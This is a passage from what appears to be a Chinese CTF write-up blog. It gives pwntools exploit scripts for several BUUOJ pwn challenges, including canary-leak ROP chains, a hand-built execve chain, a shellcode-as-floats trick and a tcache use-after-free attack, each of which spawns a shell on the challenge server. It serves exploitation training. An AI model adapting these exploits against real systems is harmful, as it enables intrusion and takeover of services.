class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">canary_list = []</span><br><span class="line">def getRop():</span><br><span class="line">	rop = []</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec060) # @ .data</span><br><span class="line">	rop.append(0x080b9856) # pop eax ; ret</span><br><span class="line">	rop.append(0x6E69622F)</span><br><span class="line">	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec064) # @ .data + 4</span><br><span class="line">	rop.append(0x080b9856) # pop eax ; ret</span><br><span class="line">	rop.append(0x68732F2F)</span><br><span class="line">	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">	rop.append(0x0804a773) # xor eax, eax ; ret</span><br><span class="line">	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	rop.append(0x08049021) # pop ebx ; ret</span><br><span class="line">	rop.append(0x080ec060) # @ .data</span><br><span class="line">	rop.append(0x08070521) # pop ecx ; pop ebx ; ret</span><br><span class="line">	rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">	rop.append(0x080ec060) # padding without overwrite ebx</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">	rop.append(0x0804a773) # xor eax, eax ; ret</span><br><span class="line">	rop.append(0x08096a87) # add eax,2 ; ret</span><br><span class="line">	rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">	rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">	rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">	rop.append(0x0806e173) # int 0x80</span><br><span class="line">	return rop</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_sw_6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	sh.recvuntil("Name:")</span><br><span class="line">	sh.sendline("fuckyou")</span><br><span class="line">	#leak 1</span><br><span class="line">	sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">	sh.sendline("301")</span><br><span class="line">	num = 0x10000000</span><br><span class="line">	for i in range(0,299):</span><br><span class="line">		sh.recvuntil(": ")</span><br><span class="line">		sh.sendline(str(num))</span><br><span class="line">		canary_list.append(num)</span><br><span class="line">		num = num + 0xCD7C24</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	sh.sendline(str(0x0))</span><br><span class="line">	sh.recvuntil("The result is ")</span><br><span class="line">	magic1 = int(sh.recvuntil("\n",False),10) - 299</span><br><span class="line">	canary_min_1 = (299 - magic1 - 1) * 0xCD7C24 + 0x10000000</span><br><span class="line">	canary_max_1 = (299 - magic1) * 0xCD7C24 + 0x10000000</span><br><span class="line">	sh.recvuntil("Continue?(y/n)")</span><br><span class="line">	sh.sendline("y")</span><br><span class="line">	#leak 2</span><br><span class="line">	delta2 = (canary_max_1 - canary_min_1) / 299</span><br><span class="line">	num = canary_min_1</span><br><span class="line">	sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">	sh.sendline("301")	</span><br><span class="line">	for i in range(0,299):</span><br><span class="line">		sh.recvuntil(": ")</span><br><span class="line">		sh.sendline(str(num))</span><br><span class="line">		num = delta2 + num</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	sh.sendline(str(0x0))</span><br><span class="line">	sh.recvuntil("The result is ")</span><br><span class="line">	magic2 = int(sh.recvuntil("\n",False),10) - 299</span><br><span class="line">	canary_min_2 = (299 - magic2 - 1) * delta2 + canary_min_1</span><br><span class="line">	canary_max_2 = (299 - magic2) * delta2 + canary_min_1</span><br><span class="line">	sh.recvuntil("Continue?(y/n)")</span><br><span class="line">	sh.sendline("y")	</span><br><span class="line">	#leak 3	</span><br><span class="line">	delta3 = (canary_max_2 - canary_min_2) / 299</span><br><span class="line">	num = canary_min_2</span><br><span class="line">	sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">	sh.sendline("301")</span><br><span class="line">	for i in range(0,299):</span><br><span class="line">		sh.recvuntil(": ")</span><br><span class="line">		sh.sendline(str(num))</span><br><span class="line">		num = delta3 + num</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	sh.sendline(str(0x0))</span><br><span class="line">	sh.recvuntil("The result is ")</span><br><span class="line">	magic3 = int(sh.recvuntil("\n",False),10) - 299</span><br><span class="line">	canary_min_3 = (299 - magic3 - 1) * delta3 + canary_min_2</span><br><span class="line">	canary_max_3 = (299 - magic3) * delta3 + canary_min_2</span><br><span class="line">	sh.recvuntil("Continue?(y/n)")</span><br><span class="line">	sh.sendline("y")</span><br><span class="line">	canary = (canary_max_3 >> 8) << 8</span><br><span class="line">	sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">	sh.sendline("301")</span><br><span class="line">	ROP = getRop()</span><br><span class="line">	for i in range(0,300):</span><br><span class="line">		sh.recvuntil(": ")</span><br><span class="line">		sh.sendline(str(0xdeadbeef))</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	sh.sendline(str(canary))</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	sh.sendline(str(0xdeadbeef))</span><br><span class="line">	for i in ROP:</span><br><span class="line">		sh.recvuntil(": ")</span><br><span class="line">		sh.sendline(str(i))</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	sh.sendline("0")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20133,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x36-ping-gnop-hackover-2016"><a href="#0x36-ping-gnop-hackover-2016" class="headerlink" title="0x36 ping_gnop_hackover_2016"></a>0x36 ping_gnop_hackover_2016</h2><h3 id="我将这题称为ROPgadget-–ropchain人工版"><a href="#我将这题称为ROPgadget-–ropchain人工版" class="headerlink" title="我将这题称为ROPgadget –ropchain人工版"></a>我将这题称为ROPgadget –ropchain人工版</h3><h3 id="题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell"><a href="#题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell" class="headerlink" title="题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int 0x80拿到shell"></a>题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过<code>int 0x80</code>拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ping_gnop_hackover_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ping_gnop_hackover_2016")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	pop_ebx_ret = 0x08050C5E</span><br><span class="line">	pop_ecx_ret = 0x080e05f5</span><br><span class="line">	pop_eax_ret = 0x080b9b26</span><br><span class="line">	pop_edx_ret = 0x0806fe6a</span><br><span class="line">	pop_esi_ret = 0x08049a34</span><br><span class="line">	xor_eax_eax_ret = 0x08049573</span><br><span class="line">	push_eax_ret = 0x080b9ac6</span><br><span class="line">	int_0x80 = 0x0806d9c5</span><br><span class="line">	xchg_eax_edx_ret = 0x0806cf29</span><br><span class="line">	add_eax_3_ret = 0x08096be0</span><br><span class="line">	add_eax_2_ret = 0x08096bc7</span><br><span class="line">	add_eax_1_ret = 0x0807b576</span><br><span class="line">	add_al_a_ret = 0x080e4dc2</span><br><span class="line">	mov_eax_a_ret = 0x080e4dc2</span><br><span class="line">	mov_eax_ecx_ret = 0x08070408</span><br><span class="line">	pop_ecx_ebx_ret = 0x0806fe91</span><br><span class="line">	mov_eax_ecx_pop_3_ret = 0x080498B6</span><br><span class="line">	mov_ptr_edx_eax_ret = 0x0805596b</span><br><span class="line">	add_al_89 = 0x08056e76</span><br><span class="line">	sub_al_83 = 0x08077c0f</span><br><span class="line">	dec_eax = 0x08064a93</span><br><span class="line">	offset = 37</span><br><span class="line">	payload = 'a' * offset</span><br><span class="line">	payload += p32(0x1337CAFE)</span><br><span class="line">	payload += 'aaaabaaacaaadaaaeaaafaaa'</span><br><span class="line">	payload += p32(pop_edx_ret)</span><br><span class="line">	payload += p32(0x080ED584)</span><br><span class="line">	payload += p32(pop_ecx_ret)</span><br><span class="line">	payload += "/bin"</span><br><span class="line">	payload += p32(mov_eax_ecx_pop_3_ret)</span><br><span class="line">	payload += p32(0xdeadbeef) * 3</span><br><span class="line">	payload += p32(mov_ptr_edx_eax_ret)</span><br><span class="line">	payload += p32(pop_edx_ret)</span><br><span class="line">	payload += p32(0x080ED588)</span><br><span class="line">	payload += p32(pop_ecx_ret)</span><br><span class="line">	payload += "//sh"</span><br><span class="line">	payload += p32(mov_eax_ecx_pop_3_ret)</span><br><span class="line">	payload += p32(0xdeadbeef) * 3</span><br><span class="line">	payload += p32(mov_ptr_edx_eax_ret)</span><br><span class="line">	payload += p32(pop_ecx_ebx_ret)	</span><br><span class="line">	payload += p32(0x080ed594)	</span><br><span class="line">	payload += p32(0x080ed584)	</span><br><span class="line">	payload += p32(xor_eax_eax_ret)</span><br><span class="line">	payload += p32(xchg_eax_edx_ret)</span><br><span class="line">	payload += p32(xor_eax_eax_ret)</span><br><span class="line">	payload += p32(add_al_a_ret)</span><br><span class="line">	payload += p32(add_al_a_ret)</span><br><span class="line">	for i in range(0,9):</span><br><span class="line">		payload += p32(dec_eax)</span><br><span class="line">	payload += p32(int_0x80)</span><br><span class="line">	sh.sendline(payload[::-1])</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20045,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x37-warmup"><a href="#0x37-warmup" class="headerlink" title="0x37 warmup"></a>0x37 warmup</h2><h3 id="这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"><a href="#这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell" class="headerlink" title="这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"></a>这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("warmup")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./warmup")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	write_addr = 0x08048135</span><br><span class="line">	read_addr  = 0x0804811D</span><br><span class="line">	execve_addr = 0x08048122</span><br><span class="line">	offset = 32</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p32(read_addr)</span><br><span class="line">	payload += p32(0x080480D8)</span><br><span class="line">	payload += p32(0)</span><br><span class="line">	payload += p32(0x80491bc)</span><br><span class="line">	payload += p32(0x80491bc)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send("/bin/sh" + '\x00'*4)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	offset = 32</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p32(read_addr)</span><br><span class="line">	payload += p32(0x08048122)</span><br><span class="line">	payload += p32(0)</span><br><span class="line">	payload += p32(0x80491bc)</span><br><span class="line">	payload += p32(0x804920c) </span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send("/bin/sh" + '\x00'*4)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20000,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x38-fixedpoint-plaid-2016"><a href="#0x38-fixedpoint-plaid-2016" class="headerlink" title="0x38 fixedpoint_plaid_2016"></a>0x38 fixedpoint_plaid_2016</h2><h3 id="这题就是典型的shellcode，找数字吧小伙子"><a href="#这题就是典型的shellcode，找数字吧小伙子" class="headerlink" title="这题就是典型的shellcode，找数字吧小伙子~~"></a>这题就是典型的shellcode，找数字吧小伙子~~</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("fixedpoint_plaid_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def write(num):</span><br><span class="line">	sh.sendline(str(num))</span><br><span class="line">	sleep(0.1)</span><br><span class="line">	sh.sendline("395841308")</span><br><span class="line">	sleep(0.1)</span><br><span class="line">	sh.sendline("175700696")</span><br><span class="line">	sleep(0.1)</span><br><span class="line">	sh.sendline("177668635")</span><br><span class="line">def send(num):</span><br><span class="line">	sh.sendline(str(num))</span><br><span class="line">	sleep(0.1)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./fixedpoint_plaid_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	send(443750948)</span><br><span class="line">	write(394804464)</span><br><span class="line">	write(395349960)</span><br><span class="line">	write(395424832)</span><br><span class="line">	write(395478312)</span><br><span class="line">	write(394804464)</span><br><span class="line">	write(394804464)</span><br><span class="line">	write(395531792)</span><br><span class="line">	write(395414136)</span><br><span class="line">	write(394301752)</span><br><span class="line">	send(188835259)</span><br><span class="line">	send(275002318)</span><br><span class="line">	send(247465383)</span><br><span class="line">	send(274506417)</span><br><span class="line">	sh.sendline("a")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20072,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x39-ciscn-2019-final-2"><a href="#0x39-ciscn-2019-final-2" class="headerlink" title="0x39 ciscn_2019_final_2"></a>0x39 ciscn_2019_final_2</h2><h3 id="典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"><a href="#典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag" class="headerlink" title="典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"></a>典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_final_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def addInt(num):</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("your inode number:")</span><br><span class="line">    sh.send(str(num))</span><br><span class="line">def showInt():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil(":")</span><br><span class="line">    return sh.recvuntil("\n",True)</span><br><span class="line">def showShort():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil(":")</span><br><span class="line">    return sh.recvuntil("\n",True)</span><br><span class="line">def addShort(num):</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("your inode number:")</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line">def freeInt():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">def freeShort():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_2019_final_2")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    addInt(0x11)</span><br><span class="line">    freeInt()</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    freeShort()</span><br><span class="line">    addInt(0x11)</span><br><span class="line">    freeShort()</span><br><span class="line">    chunk_addr1 = int(showShort(),10)</span><br><span class="line">    addShort(chunk_addr1 - 0xa0)</span><br><span class="line">    addShort(chunk_addr1 - 0xa0)</span><br><span class="line">    addShort(0x91)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        freeInt()</span><br><span class="line">        addShort(0x21)</span><br><span class="line">    freeInt()</span><br><span class="line">    chunk_addr2 = int(showInt(),10)</span><br><span class="line">    main_arena = chunk_addr2 - 96</span><br><span class="line">    fileno = main_arena - 0x1D8</span><br><span class="line">    addInt(fileno)</span><br><span class="line">    addInt(0x100)</span><br><span class="line">    freeInt()</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    freeInt()</span><br><span class="line">    chunk_addr3 = int(showInt(),10)</span><br><span class="line">    addInt(chunk_addr3 - 0x30)</span><br><span class="line">    addInt(0x9999)</span><br><span class="line">    addInt(fileno)</span><br><span class="line">    addInt(666)</span><br><span class="line">    sh.sendline("4")</span><br><span class="line">    if debug == 1:</span><br><span class="line">        log.success("pid = " + str(sh.pid)) </span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("pwn.buuoj.cn",20231,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x40-强网杯2019-拟态-STKOF"><a href="#0x40-强网杯2019-拟态-STKOF" class="headerlink" title="0x40 强网杯2019 拟态 STKOF"></a>0x40 强网杯2019 拟态 STKOF</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 